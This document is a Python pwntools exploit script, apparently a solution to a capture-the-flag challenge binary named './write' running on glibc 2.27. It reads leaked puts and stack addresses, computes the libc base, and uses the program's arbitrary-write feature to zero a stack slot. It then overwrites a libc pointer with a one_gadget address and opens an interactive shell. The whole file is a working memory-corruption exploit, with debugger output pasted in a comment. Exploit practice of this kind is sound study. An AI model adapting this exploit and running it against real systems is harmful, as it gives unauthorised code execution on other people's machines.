from pwn import *

binary = "./write"
p=process(['/media/sf_kalishared/tools/itl-master/linkers/x64/ld-2.27.so','./write'],env={"LD_PRELOAD":"./libc-2.27.so"})
libc=ELF('./libc-2.27.so')

def attach():
    s = '''
brva 0x0129c
init-pwndbg
    '''
    gdb.attach(p, s)

p.recvuntil('puts:')
puts = int(p.recvline().strip(), 16)
p.recvuntil('stack:')
stack = int(p.recvline().strip(), 16)

log.info('Stack leak: ' + hex(stack))
log.info('Libc leak: ' + hex(puts))

# stack_leak = int(t, 16)
'''
Stack leak: 0x7ffc987fa308
pwndbg> x/gx $rsp+0x40
0x7ffc987fa2f8: 0x0000000100000000
pwndbg> x/gx $rsp+0x70
0x7ffc987fa328: 0x00007ff7aa139b97
'''
stack_offset = 0x7ffc987fa2f8 - 0x7ffc987fa308
stack_fix_loc = stack + stack_offset

offset = 0x7ffff7dcf0a8 - 0x7ffff7a649c0
libcbase = puts - libc.symbols['puts']

# writeloc is in got of libc
writeloc = puts + offset
one_gadget = libcbase + 0x4f322

# attach()

def write(loc, data):
    p.sendline('w')
    log.info('Writeloc: ' + hex(loc))
    log.info('Writeval: ' + hex(data))
    p.sendline(str(loc))
    p.sendline(str(data))

write(stack_fix_loc, 0)
write(writeloc, one_gadget)
p.interactive()
